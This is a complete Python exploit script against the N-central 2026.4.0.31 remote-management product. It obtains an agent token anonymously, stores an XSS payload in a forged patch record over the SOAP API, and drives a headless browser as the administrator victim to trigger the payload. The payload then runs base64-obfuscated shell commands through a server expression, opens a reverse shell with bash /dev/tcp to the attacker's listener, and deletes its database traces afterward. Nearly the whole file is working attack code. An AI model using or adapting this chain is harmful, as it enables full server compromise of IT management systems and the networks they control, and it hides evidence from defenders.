#!/usr/bin/env python3
"""N-central 2026.4.0.31: anonymous MMS3 stored XSS to nable RCE."""

import argparse
import base64
import hashlib
import html
import json
import os
import re
import time
import uuid

import requests
import urllib3
from pwn import context, listen
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
context.log_level = "error"


def options():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="192.168.1.14")
    p.add_argument("--appliance-id", default="1807387629")
    p.add_argument("--device-id", default="506682778")
    p.add_argument("--source-ip")
    p.add_argument("--lhost", required=True)
    p.add_argument("--lport", type=int, default=4444)
    p.add_argument("--listen-bind", default="0.0.0.0")
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--shell", action="store_true")
    p.add_argument("--victim-user", default="productadmin@n-able.com")
    p.add_argument("--victim-password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--proxy", required=True)
    return p.parse_args()


class Chain:
    def __init__(self, opt):
        self.o = opt
        self.soap_url = f"https://{opt.target}/dms2/services2/ServerMMS3"
        self.ui = f"https://{opt.target}:8443"
        self.guid = str(uuid.uuid4())
        self.hardware = "agent-" + uuid.uuid4().hex[:16]
        self.session = requests.Session()
        self.session.verify = False
        self.session.proxies = {"http": opt.proxy, "https": opt.proxy}
        self.session.headers.update(
            {
                "Content-Type": "application/soap+xml; charset=UTF-8",
                "Accept": "application/soap+xml",
                "X-Forwarded-For": opt.source_ip,
            }
        )
        self.token = None
        self.sid = None
        self.jwt_id = None

    def post(self, xml, auth=False, sid=False):
        headers = {}
        if auth:
            headers["Authorization"] = "Bearer " + self.token
        if sid:
            headers["X-Session-Id"] = self.sid
        response = self.session.post(
            self.soap_url, data=xml.encode(), headers=headers, timeout=60
        )
        return response

    @staticmethod
    def value(body, tag):
        match = re.search(
            rf"<{tag}[^>]*>\s*(?:<return>)?([^<]+)(?:</return>)?\s*</{tag}>",
            body,
        )
        if match:
            return match.group(1)
        match = re.search(r"<return>([^<]+)</return>", body)
        if not match:
            raise RuntimeError(f"missing {tag} response value")
        return match.group(1)

    def acquire(self):
        passcode = hashlib.sha256(self.o.appliance_id.encode()).hexdigest()
        xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms3.nobj.nable.com/"><soap:Body><m:AcquireToken>
<m:applianceId>{self.o.appliance_id}</m:applianceId>
<m:passcode>{passcode}</m:passcode><m:hardwareId>{self.hardware}</m:hardwareId>
</m:AcquireToken></soap:Body></soap:Envelope>'''
        response = self.post(xml)
        if response.status_code != 200:
            raise RuntimeError("AcquireToken failed")
        self.token = self.value(response.text, "AcquireTokenResponse")
        part = self.token.split(".")[1]
        payload = json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))
        self.jwt_id = payload["jti"]

        xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms3.nobj.nable.com/"><soap:Body><m:ConfirmTokenReceived>
<m:jwtId>{self.jwt_id}</m:jwtId></m:ConfirmTokenReceived></soap:Body></soap:Envelope>'''
        if self.post(xml).status_code != 200:
            raise RuntimeError("ConfirmTokenReceived failed")

        xml = '''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms3.nobj.nable.com/"><soap:Body><m:SessionHello>
<m:version>2.0.0</m:version><m:applianceVersion>1.0.0.0</m:applianceVersion>
<m:agent_OSID>winnt</m:agent_OSID><m:agent_OS>Windows</m:agent_OS>
<m:timeZoneID>-05:00</m:timeZoneID></m:SessionHello></soap:Body></soap:Envelope>'''
        response = self.post(xml, auth=True)
        if response.status_code != 200:
            raise RuntimeError("SessionHello failed")
        self.sid = self.value(response.text, "SessionHelloResponse")

    def submit_patch(self, payload):
        escaped = html.escape(payload, quote=True)
        xml = f'''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms3.nobj.nable.com/"><soap:Body><m:PatchSubmitTableData>
<m:tableName>patch</m:tableName><m:tableData>
<m:DataArray><m:Key>patchguid</m:Key><m:Value>{self.guid}</m:Value></m:DataArray>
<m:DataArray><m:Key>kbnumbers</m:Key><m:Value>KB5000000</m:Value></m:DataArray>
<m:DataArray><m:Key>title</m:Key><m:Value>Security Update</m:Value></m:DataArray>
<m:DataArray><m:Key>description</m:Key><m:Value>System security update</m:Value></m:DataArray>
<m:DataArray><m:Key>products</m:Key><m:Value></m:Value></m:DataArray>
<m:DataArray><m:Key>infourls</m:Key><m:Value>{escaped}</m:Value></m:DataArray>
<m:DataArray><m:Key>publisheddate</m:Key><m:Value>2026-11-08</m:Value></m:DataArray>
<m:DataArray><m:Key>classification</m:Key><m:Value>0fa1201d-4330-4fa8-8ae9-b877473b6441</m:Value></m:DataArray>
<m:DataArray><m:Key>uninstallsupported</m:Key><m:Value>false</m:Value></m:DataArray>
<m:DataArray><m:Key>eula</m:Key><m:Value></m:Value></m:DataArray>
<m:DataArray><m:Key>removable</m:Key><m:Value>false</m:Value></m:DataArray>
<m:DataArray><m:Key>restartbehavior</m:Key><m:Value>Never Reboots</m:Value></m:DataArray>
<m:DataArray><m:Key>mayrequestuserinput</m:Key><m:Value>false</m:Value></m:DataArray>
<m:DataArray><m:Key>mustbeinstalledexclusively</m:Key><m:Value>false</m:Value></m:DataArray>
<m:DataArray><m:Key>updatessupersededbythisupdate</m:Key><m:Value></m:Value></m:DataArray>
<m:DataArray><m:Key>updatessupersedingthisupdate</m:Key><m:Value></m:Value></m:DataArray>
<m:DataArray><m:Key>languagessupported</m:Key><m:Value>en-US</m:Value></m:DataArray>
</m:tableData></m:PatchSubmitTableData></soap:Body></soap:Envelope>'''
        response = self.post(xml, auth=True, sid=True)
        if response.status_code != 200 or "PatchSubmitTableDataResponse" not in response.text:
            raise RuntimeError("anonymous patch submission failed")

    def quit(self):
        if not self.token or not self.sid:
            return
        xml = '''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
 xmlns:m="http://mms3.nobj.nable.com/"><soap:Body><m:SessionQuit>
<m:shutdown>false</m:shutdown></m:SessionQuit></soap:Body></soap:Envelope>'''
        try:
            self.post(xml, auth=True, sid=True)
        except Exception:
            pass

    def browser(self):
        if not self.o.victim_password:
            raise SystemExit("--victim-password or PRODUCTADMIN_PASSWORD is required")
        chrome = Options()
        chrome.binary_location = "/usr/bin/chromium"
        for item in (
            "--headless=new",
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--ignore-certificate-errors",
            "--window-size=1280,900",
            f"--proxy-server={self.o.proxy}",
        ):
            chrome.add_argument(item)
        driver = webdriver.Chrome(
            service=Service("/usr/bin/chromedriver"), options=chrome
        )
        wait = WebDriverWait(driver, 30)
        driver.get(self.ui + "/login")
        wait.until(lambda d: d.find_element(By.ID, "passwordFieldId"))
        time.sleep(1)
        driver.find_element(By.ID, "userNameId").send_keys(self.o.victim_user)
        password = driver.find_element(By.ID, "passwordFieldId")
        password.send_keys(self.o.victim_password)
        password.send_keys(Keys.ENTER)
        wait.until(lambda d: "IndexAction.action" in d.current_url)
        wait.until(lambda d: d.execute_script("return typeof require==='function'"))
        driver.set_script_timeout(60)
        rendered = driver.execute_async_script(
            r'''
const [guid,device,done]=arguments;
require(['nable/services/customStatus/PatchStatusScanDetailGrid'],Grid=>{
  const table=document.createElement('table'),body=document.createElement('tbody');
  table.style.cssText='position:fixed!important;top:120px;left:120px;'
    +'z-index:2147483647!important;display:table!important;visibility:visible!important;'
    +'opacity:1!important;background:#fff;padding:24px;';
  table.append(body);document.body.append(table);
  const widget=new Grid({isLegacyService:true,deviceId:device});
  widget.patchItemRow(body,{patchGuid:guid,name:'Security Update',age:''});
  window.__patchWidget=widget;
  const link=document.getElementById(guid);
  if(link)link.style.cssText='display:inline-block!important;visibility:visible!important;'
    +'opacity:1!important;min-width:480px;min-height:48px;padding:16px;cursor:pointer;';
  done({clickable:Boolean(link),width:link?link.getBoundingClientRect().width:0});
},e=>done({error:String(e)}))
''',
            self.guid,
            self.o.device_id,
        )
        if not rendered.get("clickable"):
            driver.quit()
            raise RuntimeError("patch row did not render: " + str(rendered))
        link = wait.until(lambda d: d.find_element(By.ID, self.guid))
        driver.execute_script(
            "arguments[0].scrollIntoView({block:'center'});", link
        )
        try:
            link.click()
            result = driver.execute_async_script(
                r'''
const done=arguments[0],start=Date.now(),timer=setInterval(()=>{
  const status=document.documentElement.dataset.chainStatus;
  if(status||Date.now()-start>45000){clearInterval(timer);done(status||'timeout')}
},100)
'''
            )
        except Exception:
            driver.quit()
            raise
        if not result.startswith("posted:"):
            driver.quit()
            raise RuntimeError("victim renderer did not execute payload: " + result)
        print("browser_trigger=natural_click")
        return driver

    def cleanup_database(self, driver):
        statements = [
            f"delete from patchapprovallog where patchguid='{self.guid}'",
            f"delete from patchapproval_delayed where patchguid='{self.guid}'",
            f"delete from patchapproval where patchguid='{self.guid}'",
            f"delete from cim_patch_needed where patchguid='{self.guid}'",
            f"delete from cim_patch where updateid='{self.guid}'",
            f"delete from patch where patchguid='{self.guid}'",
            (
                "delete from activesessions where jwtid in(select jwtid from "
                f"appliance_token_data where hardwareid='{self.hardware}')"
            ),
            f"delete from appliance_token_data where hardwareid='{self.hardware}'",
        ]
        for sql in statements:
            command = f'/usr/bin/psql -U sqlrelay -d mickey -qc "{sql}"'
            encoded = base64.b64encode(command.encode()).decode()
            runtime = (
                "/bin/sh -c echo${IFS}" + encoded
                + "|/usr/bin/base64${IFS}-d|/bin/sh"
            )
            expression = (
                "new com.nable.dms.core.service.system.impl.ProcessServiceImpl()"
                f".executeCommand('{runtime}',60000L)"
            )
            driver.execute_async_script(
                r'''
const [expression,done]=arguments,q=new URLSearchParams;
q.set('ncentralTabId','cleanup');q.set('currentModule',expression);
fetch('/saveModuleSecurityManagerProfilesAction.action',{method:'POST',
 headers:{'X-Requested-With':'XMLHttpRequest','ncentralTabId':'cleanup',
 'Content-Type':'application/x-www-form-urlencoded'},
 body:q}).then(r=>done(String(r.status))).catch(e=>done(String(e)))
''',
                expression,
            )

        status = driver.execute_async_script(
            r'''
const [guid,device,done]=arguments;
fetch('/patchDescriptionPatchStatusServiceAction.action?ncentralTabId=cleanup'
  +'&deviceId='+encodeURIComponent(device)+'&patchGUID='+encodeURIComponent(guid),
  {headers:{'X-Requested-With':'XMLHttpRequest'},cache:'no-store'})
.then(async r=>{
  const text=await r.text();let body={};try{body=JSON.parse(text)}catch(_){}
  done(r.status===404||body.failed===true||body.failed==='true'?'absent':'present:'+r.status)
}).catch(e=>done('error:'+String(e)))
''',
            self.guid,
            self.o.device_id,
        )
        if status != "absent":
            raise RuntimeError("patch cleanup verification failed: " + status)
        print("cleanup=ok")


def main():
    opt = options()
    opt.source_ip = opt.source_ip or opt.lhost
    if not re.fullmatch(r"[A-Za-z0-9.:-]+", opt.lhost):
        raise SystemExit("invalid lhost")
    receiver = listen(opt.lport, bindaddr=opt.listen_bind, timeout=60)
    if opt.shell:
        effect = f"exec bash -i >& /dev/tcp/{opt.lhost}/{opt.lport} 0>&1"
    else:
        command = base64.b64encode(opt.command.encode()).decode()
        effect = (
            f"out=$(echo {command}|base64 -d|/bin/bash 2>&1);"
            f"exec 3<>/dev/tcp/{opt.lhost}/{opt.lport};printf '%s\\n' \"$out\" >&3"
        )
    encoded = base64.b64encode(effect.encode()).decode()
    runtime = (
        "/bin/bash -c echo${IFS}" + encoded
        + "|/usr/bin/base64${IFS}-d|/bin/bash"
    )
    expression = (
        "new com.nable.dms.core.service.system.impl.ProcessServiceImpl()"
        f".executeCommand('{runtime}',120000L)"
    )
    stage = f'''(async()=>{{
const q=new URLSearchParams;
q.set('ncentralTabId','details');q.set('currentModule',{json.dumps(expression)});
const r=await fetch('/saveModuleSecurityManagerProfilesAction.action',{{
method:'POST',credentials:'same-origin',headers:{{'X-Requested-With':'XMLHttpRequest',
'Content-Type':'application/x-www-form-urlencoded'}},body:q}});
document.documentElement.dataset.chainStatus='posted:'+r.status;
}})().catch(e=>document.documentElement.dataset.chainStatus='error:'+String(e))'''
    stage_b64 = base64.b64encode(stage.encode()).decode()
    payload = (
        'x"><img src="x" onerror="if(!window.__ncChain)'
        f"{{window.__ncChain=1;eval(atob('{stage_b64}'))}}\"><span data-x=\"1"
    )

    chain = Chain(opt)
    driver = None
    database_cleaned = False
    try:
        chain.acquire()
        chain.submit_patch(payload)
        chain.quit()
        driver = chain.browser()
        receiver.wait_for_connection()
        if receiver.sock is None:
            raise RuntimeError("nable callback not received")
        if opt.shell:
            receiver.interactive()
        else:
            output = receiver.recvall(timeout=10).decode(errors="replace").strip()
            print(output)
        chain.cleanup_database(driver)
        database_cleaned = True
    finally:
        chain.quit()
        if driver:
            try:
                if not database_cleaned:
                    try:
                        chain.cleanup_database(driver)
                    except Exception:
                        pass
                driver.get(chain.ui + "/logoutLoginAction.action")
            finally:
                driver.quit()


if __name__ == "__main__":
    main()
